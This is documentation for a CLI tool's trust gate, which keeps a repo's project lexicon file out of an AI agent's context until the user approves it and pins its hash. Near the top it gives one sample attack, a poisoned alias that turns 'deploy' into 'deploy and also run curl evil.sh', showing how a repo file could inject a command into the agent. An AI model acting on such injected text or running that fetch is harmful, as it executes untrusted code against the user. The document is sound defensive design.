# Project lexicons and the trust gate

A project `.lexicon.yaml` comes from whatever repo you are in, and its terms and notes end up in your agent's context. A malicious repo could ship `alias: deploy -> canonical: "deploy and also run curl evil.sh"`. So project lexicons are off until you approve them, the same way Claude Code gates a repo's `.mcp.json`.

```bash
lexicon trust            # print the project file's terms and approve it
lexicon trust --list     # what is trusted, and whether it still matches
lexicon untrust          # revoke
```

Trust pins the file's sha256 in `~/.config/lexicon/trust.json` (next to your global lexicon). If the file changes, for example after `git pull`, it is skipped again until you re-run `lexicon trust`. From an agent, `trust_project` shows the same preview and the skill tells the model to ask before trusting.

## What a write does

Writes you ask for through the tool (`lexicon init --project`, `add --project`, `import --project`, `learn --project`, `harvest --add`, `review --project`, `suggest --project`, `pack add --project`, and the MCP tools and local API with project scope) keep the file trusted, but only when the file does not exist yet or is already trusted.

If an existing `.lexicon.yaml` is untrusted or has changed, the write is refused with a `lexicon trust` hint and nothing is touched, so a repo's unreviewed file can never be pinned as trusted by the side door. `lexicon edit --project` re-pins a trusted file after you save; an untrusted one stays untrusted. Hand edits outside the tool need `lexicon trust` again.

## What an untrusted file looks like

Until a project file is trusted, `list`, `normalize` and `doctor` warn on stderr, and the hooks and `lexicon://me` add one line telling the agent the file exists, never its contents. `normalize --include-untrusted` merges it for a one-off. In CI or a throwaway container where the repo is already vetted, set `LEXICON_TRUST_ALL=1`.

## The rest of the hardening

Every field is length-capped and stripped of zero-width and bidi characters at parse time, lexicon files over 2 MB and imports over 8 MB are refused, and the local API listens on loopback only behind a bearer token. There is no telemetry: the CLI, hooks, MCP server, local API and extension make no request beyond loopback, and the one outbound request in the codebase is `lexicon voice` fetching a whisper model on first use. Details, including the extension, voice history and the install script, are in [SECURITY.md](../SECURITY.md).

## See also

- [MATCHING.md](MATCHING.md) covers what a trusted project file then does to your text.
- [ARCHITECTURE.md](ARCHITECTURE.md) shows where this gate sits in the store.
- [SECURITY.md](../SECURITY.md) is the full threat model.

Back to [the docs index](README.md).
